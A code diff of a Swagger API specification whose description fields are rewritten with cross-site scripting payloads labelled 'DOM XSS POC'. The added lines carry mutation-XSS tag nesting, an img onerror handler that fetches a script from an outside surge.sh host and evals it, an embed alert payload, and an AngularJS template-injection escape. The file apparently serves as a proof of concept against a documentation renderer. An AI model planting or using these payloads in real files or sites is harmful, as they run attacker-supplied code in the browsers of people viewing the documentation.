@@ -1,7 +1,8 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://exuberant-ice.surge.sh/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1></mtext></math></p></div><div class="description"></div><h1>DOM XSS POC</h1><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3UQVyPEfTA5CR1SmA4F3cGfbbDqW-qrvGsjhcWABW&s"></div></textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='o'"></script><embed src=:alert(1)>{{constructor.constructor('alert(155555)')()}}
+</textarea><img src onerror=fetch(`https://exuberant-ice.surge.sh/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1></mtext></math></p></div><div class="description"></div><h1>DOM XSS POC</h1><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3UQVyPEfTA5CR1SmA4F3cGfbbDqW-qrvGsjhcWABW&s"></div></textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: production
 basePath: /JSSResource/
 produces:
@@ -26,7 +27,8 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>">o'"></script><embed src=:alert(1)>{{constructor.constructor('alert(155555)')()}}
+</form>
 
           format: int64
           in: path
